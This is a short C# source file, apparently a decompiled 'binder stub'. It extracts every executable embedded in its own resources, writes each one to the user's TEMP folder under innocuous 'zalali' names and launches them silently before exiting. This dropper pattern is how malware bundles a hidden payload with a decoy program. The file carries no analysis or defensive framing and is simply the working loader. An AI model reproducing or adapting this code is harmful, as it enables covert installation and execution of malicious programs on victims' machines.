using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace binderstub;

internal class Program
{
	private static void Main()
	{
		string text = "exe";
		string text2 = "exe";
		string text3 = "";
		string[] array = new string[2] { text, text2 };
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		int num = 0;
		string[] array2 = manifestResourceNames;
		foreach (string text4 in array2)
		{
			if (text4.IndexOf(".exe") != -1)
			{
				Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text4);
				byte[] array3 = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array3, 0, array3.Length);
				text3 = Environment.GetEnvironmentVariable("TEMP") + "\\zalali" + num + "." + array[num];
				FileStream fileStream = new FileStream(text3, FileMode.Create);
				fileStream.Write(array3, 0, array3.Length);
				fileStream.Dispose();
				manifestResourceStream.Dispose();
				Process.Start(text3);
				num++;
			}
		}
		Application.Exit();
	}
}
